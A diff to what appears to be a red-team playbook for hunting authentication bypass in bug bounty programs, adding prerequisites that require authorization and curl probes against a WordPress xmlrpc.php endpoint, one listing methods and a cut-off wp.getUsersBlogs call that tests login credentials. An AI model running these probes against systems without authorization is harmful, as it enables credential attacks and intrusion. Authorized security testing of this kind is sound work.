@@ -8,6 +8,41 @@ category: redteam
 tags: [auth, bypass, hunt, redteam]
 ---
 
+## When to Use
+
+- Hunting auth bypass — see the Legacy-Protocol Matrix for branded-UI vs legacy-endpoint patterns.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `python3`, `subfinder`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
+  -H "Content-Type: text/xml" \
+  -d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.listMethods</methodName>
+  <params></params>
+</methodCall>'
+
+# If 200 with method list → XMLRPC is enabled, test auth:
+curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
+  -H "Content-Type: text/xml" \
+  -d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+# ... (continues in Procedure)
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 Auth bypass is consistently one of the highest-paying vulnerability classes in bug bounty because it directly violates the most fundamental security control. High-value targets include:
